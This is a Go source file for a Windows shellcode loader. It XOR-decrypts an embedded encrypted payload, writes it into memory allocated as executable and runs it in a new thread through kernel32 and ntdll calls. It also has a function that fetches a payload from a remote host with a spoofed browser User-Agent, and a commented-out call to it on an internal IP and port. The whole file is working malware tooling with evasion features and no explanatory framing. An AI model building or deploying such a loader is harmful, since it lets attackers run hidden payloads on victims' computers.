package main

import (
	_ "embed"
	"encoding/base64"
	"io/ioutil"
	"log"
	"net/http"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	CUALQUIERNOMBRE        = 0xFFFFFFFF
	PAGE_EXECUTE_READWRITE = 0x40
)

//go:embed Encrypted.bin
var testing []byte
var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	ntdll               = syscall.MustLoadDLL("ntdll.dll")
	WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread        = kernel32.MustFindProc("CreateThread")
)

func callpayload(code string) string {
	url, err := http.Get(code)
	UserAgent := `Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 `
	url.Header.Set("User-Agent", UserAgent)

	if err != nil {
		log.Fatal(err)
	}

	reqBody, err := ioutil.ReadAll(url.Body)
	if err != nil {
		log.Fatal(err)
	}

	return string(reqBody)

}

func Base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)

}
func Xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}
func main() {

	dec := Xor(testing, 31)
	//content := callpayload("http://10.10.10.100:9001/code.png")

	//shellcode := Base64Decode(content)

	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(dec)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}

	_, _, err = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&dec[0])),
		uintptr(len(dec)),
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}

	// jump to shellcode
	//syscall.Syscall(addr, 0, 0, 0, 0)
	_, _, err = CreateThread.Call(
		0,    // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		0,    // [in]            SIZE_T                  dwStackSize,
		addr, // shellcode address
		0,    // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
		0,    // [in]            DWORD                   dwCreationFlags,
		0,    // [out, optional] LPDWORD                 lpThreadId
	)

	//time.Sleep(8 * time.Second)

	ThreadAddr, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
	WaitForSingleObject.Call(ThreadAddr, CUALQUIERNOMBRE)
}
